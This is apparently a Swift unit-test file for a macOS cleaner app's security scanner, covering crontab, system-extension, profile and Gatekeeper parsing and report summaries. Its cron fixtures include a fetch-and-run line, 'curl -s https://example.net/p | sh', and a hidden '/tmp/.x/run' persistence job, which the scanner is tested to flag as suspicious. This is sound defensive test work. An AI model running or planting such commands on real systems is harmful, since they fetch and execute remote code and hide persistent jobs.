import Foundation
import Testing
@testable import MacCleaner

struct SecuritySystemInventoryParserTests {
    @Test func parsesCrontab() {
        let output = """
        # m h dom mon dow command
        SHELL=/bin/sh
        MAILTO=""
        */15 * * * * /usr/local/bin/backup --quiet
        @reboot /Users/test/bin/start.sh

        0 3 * * 1   curl -s https://example.net/p | sh
        broken line
        """
        let jobs = SecuritySystemInventoryParser.cronJobs(output)
        #expect(jobs.count == 3)
        #expect(jobs[0].schedule == "*/15 * * * *")
        #expect(jobs[0].command == "/usr/local/bin/backup --quiet")
        #expect(jobs[0].lineNumber == 4)
        #expect(jobs[1].schedule == "@reboot")
        #expect(jobs[1].command == "/Users/test/bin/start.sh")
        #expect(jobs[2].schedule == "0 3 * * 1")
        #expect(jobs[2].command == "curl -s https://example.net/p | sh")
    }

    @Test func cronFindingsFlagRiskyJobsAndSummarize() {
        let jobs = [
            SecurityCronJob(schedule: "@reboot", command: "/tmp/.x/run", lineNumber: 1),
            SecurityCronJob(schedule: "0 3 * * *", command: "/usr/local/bin/backup", lineNumber: 2),
            SecurityCronJob(schedule: "0 4 * * *", command: "curl -s https://example.net/p | sh", lineNumber: 3),
        ]
        let result = SecurityScanner.cronFindings(jobs)
        #expect(result.findings.filter { $0.severity == .suspicious }.count == 2)
        #expect(result.findings.contains { $0.severity == .info && $0.title == "3 cron jobs are scheduled for your account" })
        #expect(result.inventory.count == 3)
        #expect(SecurityScanner.cronFindings([]).findings.isEmpty)
    }

    @Test func parsesSystemExtensions() {
        let output = """
        5 extension(s)
        --- com.apple.system_extension.network_extension (Go to 'System Settings > General > Login Items & Extensions > Network Extensions' to modify these system extension(s))
        enabled\tactive\tteamID\tbundleID (version)\tname\t[state]
        \t*\tP2PHZ9K5JJ\tcom.example.vpn-extension (5.8.0/31000013242)\tExample VPN\t[activated disabled]
        *\t*\tJ6S6Q257EK\tch.example.WireGuard-Extension (6.5.1/3106797)\tExample WireGuard\t[activated enabled]
        --- com.apple.system_extension.driver_extension (Go to 'System Settings > General > Login Items & Extensions > Driver Extensions' to modify these system extension(s))
        enabled\tactive\tteamID\tbundleID (version)\tname\t[state]
        *\t*\tG43BCU2T37\torg.example.VirtualHIDDevice (1.8.0/1.8.0)\torg.example.VirtualHIDDevice\t[activated enabled]
        """
        let extensions = SecuritySystemInventoryParser.systemExtensions(output)
        #expect(extensions.count == 3)
        #expect(extensions[0].category == "com.apple.system_extension.network_extension")
        #expect(extensions[0].isEnabled == false)
        #expect(extensions[0].isActive == true)
        #expect(extensions[0].teamIdentifier == "P2PHZ9K5JJ")
        #expect(extensions[0].bundleIdentifier == "com.example.vpn-extension")
        #expect(extensions[0].version == "5.8.0/31000013242")
        #expect(extensions[0].name == "Example VPN")
        #expect(extensions[0].state == "activated disabled")
        #expect(extensions[0].categoryTitle == "Network extension")
        #expect(extensions[2].categoryTitle == "Driver extension")
        #expect(extensions[2].isEnabled)
    }

    @Test func parsesConfigurationProfiles() {
        #expect(SecuritySystemInventoryParser.systemProfileCount("There are no configuration profiles installed on this system") == 0)
        #expect(SecuritySystemInventoryParser.systemProfileCount("There are 3 configuration profiles installed on this system") == 3)
        #expect(SecuritySystemInventoryParser.systemProfileCount("There is 1 configuration profile installed") == 1)
        #expect(SecuritySystemInventoryParser.systemProfileCount("profiles: error") == nil)

        let identifiers = SecuritySystemInventoryParser.userProfileIdentifiers("""
        test[1] attribute: profileIdentifier: com.example.wifi
        test[2] attribute: profileIdentifier: com.example.vpn
        There are 2 configuration profiles installed for 'test'
        """)
        #expect(identifiers == ["com.example.wifi", "com.example.vpn"])
        #expect(SecuritySystemInventoryParser.userProfileIdentifiers("There are no configuration profiles installed for user 'test'").isEmpty)

        let enrollment = SecuritySystemInventoryParser.enrollment("Enrolled via DEP: No\nMDM enrollment: Yes (User Approved)")
        #expect(enrollment.mdm == true)
        #expect(enrollment.dep == false)
    }

    @Test func profileFindingExplainsManagement() {
        var status = SecurityProfilesStatus()
        status.systemProfileCount = 0
        #expect(SecurityScanner.profileFindings(status).findings.isEmpty)

        status.userProfileIdentifiers = ["com.example.search"]
        status.isMDMEnrolled = false
        let result = SecurityScanner.profileFindings(status)
        #expect(result.findings.count == 1)
        #expect(result.findings[0].severity == .info)
        #expect(result.findings[0].remediation == .deviceManagement)
        #expect(result.inventory.map(\.name) == ["com.example.search"])
    }

    @Test func gatekeeperAssessmentOutput() {
        let accepted = SecurityGatekeeperAssessment.parse("/Applications/Safari.app: accepted\nsource=Apple System\n", exitCode: 0)
        #expect(accepted.accepted)
        #expect(accepted.source == "Apple System")
        #expect(accepted.summary == "Accepted by Gatekeeper (Apple System)")

        let rejected = SecurityGatekeeperAssessment.parse(
            "/Users/test/Downloads/Tool.app: rejected\nsource=Unnotarized Developer ID\norigin=Developer ID Application: Example (ABCDE12345)",
            exitCode: 3
        )
        #expect(!rejected.accepted)
        #expect(rejected.origin == "Developer ID Application: Example (ABCDE12345)")
    }

    @Test func reportSummaryLines() {
        #expect(SecurityReport.summaryLine(threats: 0, suspicious: 0, recommendations: 0) == "No threats or suspicious items found")
        #expect(SecurityReport.summaryLine(threats: 0, suspicious: 0, recommendations: 2) == "No threats or suspicious items · 2 recommendations")
        #expect(SecurityReport.summaryLine(threats: 0, suspicious: 1, recommendations: 2) == "No known threats · 1 suspicious item to review")
        #expect(SecurityReport.summaryLine(threats: 2, suspicious: 3, recommendations: 0) == "2 known threats found · 3 suspicious items")
    }

    @Test func reportCountsIgnoreIgnoredFindings() {
        var ignored = SecurityFinding(id: "b", severity: .suspicious, category: .persistence, title: "B", summary: "")
        ignored.isIgnored = true
        let report = SecurityReport(
            startedAt: Date(), finishedAt: Date(), posture: SecurityPosture(),
            findings: [
                SecurityFinding(id: "a", severity: .threat, category: .adware, title: "A", summary: ""),
                ignored,
                SecurityFinding(id: "c", severity: .info, category: .download, title: "C", summary: ""),
            ],
            persistenceItems: [], applications: [], quarantinedFiles: [], systemExtensions: [], limitations: [], wasCancelled: false
        )
        #expect(report.threatCount == 1)
        #expect(report.suspiciousCount == 0)
        #expect(report.informationCount == 1)
        #expect(report.countsBySeverity[.threat] == 1)
        #expect(report.summary == "1 known threat found")
        #expect(report.scanSummary.threats == 1)
        #expect(report.ignoredFindings.map(\.id) == ["b"])
    }

    @Test func findingIdentifiersAreStableAcrossLaunches() {
        #expect(SecurityHash.fnv1a("hello") == "a430d84680aabd0b")
        #expect(SecurityHash.fnv1a("") == "cbf29ce484222325")
    }

    @Test func scanSummaryRoundTripsThroughJSON() throws {
        let summary = SecurityScanSummary(date: Date(timeIntervalSince1970: 1_800_000_000), threats: 0, suspicious: 2,
                                          recommendations: 1, information: 4, protectionsOn: 4, protectionsTotal: 5, summary: "No known threats")
        let encoder = JSONEncoder()
        encoder.dateEncodingStrategy = .iso8601
        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601
        let decoded = try decoder.decode(SecurityScanSummary.self, from: encoder.encode(summary))
        #expect(decoded == summary)
    }
}
